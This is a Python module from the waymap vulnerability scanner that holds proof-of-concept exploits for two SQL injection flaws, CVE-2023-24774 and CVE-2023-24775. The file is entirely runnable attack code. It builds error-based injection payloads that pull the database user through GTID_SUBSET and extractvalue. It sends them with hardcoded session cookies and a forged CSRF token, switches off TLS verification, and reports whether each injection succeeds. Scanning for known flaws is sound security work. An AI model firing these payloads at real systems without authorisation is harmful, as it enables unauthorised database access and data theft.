# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# gen.py profile critical

from colorama import Fore, Style, init
import requests
import urllib.parse
import uuid
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Utility functions
def generate_csrf_token():
    csrf_token = uuid.uuid4()
    return str(csrf_token).replace('-', '')

def common_headers(profile_url, csrf_token):
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "zh-CN,zh",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": csrf_token,
        "Host": profile_url,
        "Content-Type": "application/x-www-form-urlencoded",
        "charset": "UTF-8",
        "Accept-Encoding": "gzip"
    }

# CVE-2023-24774 Exploit
def scan_cve_2023_24774(profile_url):
    csrf_token = generate_csrf_token()
    headers = common_headers(profile_url, csrf_token)
    profile_url = f"{profile_url}/databases/table/columns?id="
    
    cookies = {
        'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
        'ci_session': 'ca40t5m9pvlvp7gftr11qng0g0lofceq',
        'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51',
    }

    sqli = "+AND+GTID_SUBSET(CONCAT(0x12,(SELECT+(ELT(6415=6415,1))),user()),6415)--+qRTY"
    profile_url += f"{sqli}--+qRTY"
    
    print(f"Request target: {profile_url}")

    try:
        sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)

        if 'message' in sqli_request.text:
            print('**POC CVE-2023-24774: SQLi works** :)')
            return True 
        else:
            print('**POC CVE-2023-24774: SQLi does not work** :(')
            return False  

    except Exception as e:
        print(f"[ERROR] An exception occurred: {str(e)}")
        return False  

# CVE-2023-24775 Exploit
def scan_cve_2023_24775(profile_url):
    csrf_token = generate_csrf_token()
    headers = common_headers(profile_url, csrf_token)
    profile_url = f"{profile_url}/backend/member.memberLevel/index?parentField=pid&"

    cookies = {
        'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
        'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51',
        'think_lang': 'zh-cn',
    }

    sqli = "extractvalue(1, concat(char(126), user()))"
    profile_url += f"selectFields%5Bname%5D=name&selectFields%5Bvalue%5D={urllib.parse.quote_plus(sqli)}"

    print(f"Request URL: {profile_url}")

    try:
        sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)

        if 'message' in sqli_request.text:
            print('**POC CVE-2023-24775: SQLi works** :)')
            return True  
        else:
            print('**POC CVE-2023-24775: SQLi did not work** :(')
            return False  

    except Exception as e:
        print(f"[ERROR] An exception occurred: {str(e)}")
        return False 

def handle_cve_2023_24774(profile_url):
    try:
        print(f"\n{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2023_24774 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2023_24774(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2023_24774 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2023_24774 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")

def handle_cve_2023_24775(profile_url):
    try:
        print(f"\n{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2023_24775 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2023_24775(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2023_24775 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2023_24775 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
